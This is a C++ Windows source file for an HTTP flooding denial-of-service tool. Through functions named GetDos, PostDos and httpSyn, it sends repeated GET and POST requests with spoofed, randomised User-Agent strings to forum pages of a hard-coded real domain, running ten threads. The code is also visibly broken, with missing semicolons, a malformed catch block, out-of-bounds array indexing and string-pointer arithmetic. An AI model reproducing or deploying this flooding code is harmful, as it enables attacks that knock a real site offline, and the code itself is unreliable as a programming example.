#include "wALL.h"

using namespace std;
#pragma comment(lib,"wininet")


char tDomain[64] ="packetstorm.com";
int randmemb = rand(); 
int randforum = rand(); 


char* UAListA[] = { "Mozilla/3.0 ",
					"Mozilla/3.1 ",
					"Mozilla/3.6 ",
					"Mozilla/4.0 ",
					"Mozilla/4.08 ",
					"Mozilla/5.0 ",
					"Opera/9.33 ",
					"Opera/9.0 ",
					"Opera/8.90 ",
					"Opera/9.80 "							
}

char* UAListB[] = {	"(compatible; MSIE 6.0; Windows NT)",
					"(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
					"(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
					"(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
					"[en] (WinNT; U)",
					"(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
					"(compatible; MSIE 6.0; Win32)",
					"(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
					"(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
					"(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
					"(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
					"(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
					"(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
					"(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
					"Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
					"(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
					"(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
					"(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
					"(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
					"(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
					"(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
					"(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
					"(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
					"(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
					"(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
					"(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
					"(compatible; MSIE 6.1; Windows XP)",
					"(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
				};

char* URLList[] = {	
	"/forums/index.php?showforum=" + randforum,
	"/forums/index.php?showuser=" + randmemb
				};


bool Restart( )
{
	Sleep(2000);
	PostDos( );
	GetDos( );
	httpSyn( );
}

bool httpSyn( )
{
	srand(GetTickCount());
	HINTERNET hInternet[3]; 
	char szBuffer[10240];
	
	DWORD dwNumberOfBytesRead = NULL; 
	char headers[] = "HTTP/1.1"; //prob still not right, worth a shot :)
	
	hInternet[1] = InternetOpenA( UAListA[rand()%10] , UAListB[rand()%28] , INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hInternet[2] = InternetConnectA(hInternet[1], tDomain , INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	hInternet[3] = HttpOpenRequestA(hInternet[2], "GET", URLList[rand()%9] , NULL, NULL, NULL, NULL, 1);
	
	HttpSendRequestA(hInternet[3], headers, strlen(headers), 0, 0);
	InternetReadFile(hInternet[3], szBuffer, 10240, &dwNumberOfBytesRead);
	
	for(int z=0;z<3;z++){
		Sleep(5000)
		if( hInternet[z] != NULL ) InternetCloseHandle(hInternet[z]);
	}
	
	
	return true;

}

bool PostDos( )
{
srand(GetTickCount());
HINTERNET hInternet[3]; 
char szBuffer[10240];

DWORD dwNumberOfBytesRead = NULL; 
char headers[] = "HTTP/1.1"; //prob still not right, worth a shot :)

hInternet[1] = InternetOpenA( UAListA[rand()%10] , UAListB[rand()%28] , INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
hInternet[2] = InternetConnectA(hInternet[1], tDomain , INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
hInternet[3] = HttpOpenRequestA(hInternet[2], "POST", URLList[rand()%9] , NULL, NULL, NULL, NULL, 1);

HttpSendRequestA(hInternet[3], headers, strlen(headers), 0, 0);
InternetReadFile(hInternet[3], szBuffer, 10240, &dwNumberOfBytesRead);

for(int z=0;z<3;z++){
	if( hInternet[z] != NULL ) InternetCloseHandle(hInternet[z]);
}


	return true;
}


bool GetDos(  )
{
	srand(GetTickCount());
	HINTERNET hInternet[3]; 
	char szBuffer[10240];

	DWORD dwNumberOfBytesRead = NULL; 
	char headers[] = "HTTP/1.1"; //ditto

	hInternet[1] = InternetOpenA( UAListA[rand()%10] , UAListB[rand()%28] , INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hInternet[2] = InternetConnectA(hInternet[1], tDomain , INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	hInternet[3] = HttpOpenRequestA(hInternet[2], "GET", URLList[rand()%9] , NULL, NULL, NULL, NULL, 1);

	HttpSendRequestA(hInternet[3], headers, strlen(headers), 0, 0);
	InternetReadFile(hInternet[3], szBuffer, 10240, &dwNumberOfBytesRead);
	
	for(int z=0;z<3;z++){
		if( hInternet[z] != NULL ) InternetCloseHandle(hInternet[z]);
	}
	

	return true;
}


DWORD WINAPI dThread(LPVOID)
{
	try {
		GetDos( );
		PostDos();
		httpSyn();
		Sleep(300);
	}
	catch 
	{
		Restart( );
		Sleep(1000);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	HANDLE hThreads[100]; 

	for(int i=0;i<10;i++)
		hThreads[i] = CreateThread(0,0,dThread,0,0,0);

	WaitForSingleObject(hThreads[1],INFINITE);
	return 0;
}



